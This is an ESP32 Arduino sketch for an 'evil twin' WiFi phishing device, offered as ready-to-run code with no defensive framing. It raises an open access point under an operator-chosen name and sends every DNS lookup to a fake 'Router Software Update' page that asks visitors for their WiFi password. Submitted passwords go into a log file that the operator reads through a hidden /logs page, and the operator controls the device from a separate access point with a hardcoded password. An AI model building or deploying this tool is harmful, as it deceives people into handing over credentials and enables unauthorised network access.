#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include "SPIFFS.h"

const char* manageSSID = "SureWifi";
const char* managePassword = "The0PassP0";
AsyncWebServer server(80);
DNSServer dnsServer;

String captiveSSID = "NewNetworkSSID";

void startCaptivePortal() {
    WiFi.softAP(captiveSSID.c_str());
    Serial.println("Captive Portal WiFi Network Started: " + captiveSSID);

    dnsServer.start(53, "*", WiFi.softAPIP());

    server.onNotFound([](AsyncWebServerRequest *request) {
        AsyncResponseStream *response = request->beginResponseStream("text/html; charset=utf-8");
        response->print(R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Software Update</title>
<style>
  body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; }
  .container { background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
  h1, p { font-size: 1.2em; }
  form { margin-top: 20px; }
  input[type="password"], button[type="submit"] { font-size: 1.2em; width: 100%; padding: 15px; margin-top: 10px; border-radius: 5px; border: 1px solid #ddd; }
  button[type="submit"] { background-color: #007bff; color: white; border: none; cursor: pointer; }
  button[type="submit"]:hover { background-color: #0056b3; }
</style>
</head>
<body>
<div class="container">
  <h1>Router Software Update</h1>
  <p>Enter your WiFi password</p>
  <form action="/submit" method="POST">
    Password: <input type="password" name="password">
    <button type="submit">Send</button>
  </form>
</div>
</body>
</html>
        )rawliteral");
        request->send(response);
    });
}

void setup() {
    Serial.begin(115200);
    
    if (!SPIFFS.begin(true)) {
        Serial.println("An Error has occurred while mounting SPIFFS");
        return;
    }
    Serial.println("SPIFFS mounted successfully");

    
    WiFi.softAP(manageSSID, managePassword);
    Serial.print("Management WiFi Network Started: ");
    Serial.println(WiFi.softAPIP());

    
    server.on("/control", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/html; charset=utf-8", R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Control Panel</title>
<style>
    body { font-family: Arial, sans-serif; padding: 20px; background-color: #f0f0f0; }
    .container { background-color: #fff; padding: 20px; margin-top: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    h2 { font-size: 1.5em; }
    input[type="text"], input[type="submit"] { font-size: 1.2em; width: 100%; padding: 10px; margin-top: 10px; border-radius: 5px; border: 1px solid #ccc; }
  input[type="submit"] { background-color: #4CAF50; color: white; cursor: pointer; }
  input[type="submit"]:hover { background-color: #45a049; }
</style>
</head>
<body>
<div class="container">
  <h2>Captive Portal WiFi Setup</h2>
  <form action="/setssid" method="POST">
    <input type="text" name="ssid" placeholder="Enter new SSID" required>
    <input type="submit" value="RUN">
  </form>
</div>
</body>
</html>
        )rawliteral");
    });

    server.on("/setssid", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (request->hasParam("ssid", true)) {
            captiveSSID = request->getParam("ssid", true)->value();
            // Disconnect SureWifi before starting the Captive Portal
            WiFi.softAPdisconnect(true);
            delay(1000); // Ensure the previous network is fully disconnected
            startCaptivePortal();
        } else {
            request->send(200, "text/plain", "SSID is required.");
        }
    });

    
    server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (request->hasParam("password", true)) {
            String password = request->getParam("password", true)->value();
            File logFile = SPIFFS.open("/logs.txt", FILE_APPEND);
            if (logFile) {
                logFile.println("Password: " + password);
                logFile.close();
            }
            Serial.println("Password entered: " + password);
        }
        request->redirect("/thankyou");
    });

    
    server.on("/thankyou", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/html; charset=utf-8", "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Password Received</title></head><body><h1>Password Received</h1><p>Thank you!</p></body></html>");
    });

    
    server.on("/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
        String logsPage = "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>Logs</title></head><body><h2>Logs</h2>";
        File logFile = SPIFFS.open("/logs.txt", "r");
        if (logFile) {
            while (logFile.available()) {
                String logEntry = logFile.readStringUntil('\n');
                logsPage += "<p>" + logEntry + "</p>";
            }
            logFile.close();
        } else {
            logsPage += "<p>No logs found.</p>";
        }
        logsPage += "<form action='/clearLogs' method='post'><button type='submit'>Clear Logs</button></form></body></html>";
        request->send(200, "text/html", logsPage);
    });

    
    server.on("/clearLogs", HTTP_POST, [](AsyncWebServerRequest *request) {
        SPIFFS.remove("/logs.txt");
        request->redirect("/logs");
    });

    // Start the server for initial setup via SureWifi
    server.begin();
    Serial.println("HTTP server started");
}

void loop() {
    dnsServer.processNextRequest(); 
}


